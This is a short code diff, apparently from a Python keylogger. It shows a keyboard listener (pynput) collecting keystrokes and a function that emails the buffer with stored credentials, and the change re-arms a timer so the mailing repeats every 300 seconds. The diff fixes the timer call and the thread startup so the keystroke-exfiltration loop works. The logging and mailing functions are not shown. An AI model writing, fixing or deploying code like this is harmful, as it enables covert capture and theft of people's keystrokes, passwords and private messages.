@@ -29,12 +29,11 @@ def thread(email,passwd):
     global dir
     mail(email,passwd,dir)
     dir = " "
-    temp = threading.Timer(300,mail)
-    temp.start()
+    timer = threading.Timer(300,thread)
+    timer.start()
 temp = pynput.keyboard.Listener(on_press=logger)
 temp2 = options()
-thread(temp2.email,temp2.passwd)
 with temp:
-    thread()
+    thread(temp2.email,temp2.passwd)
     temp.join()
 
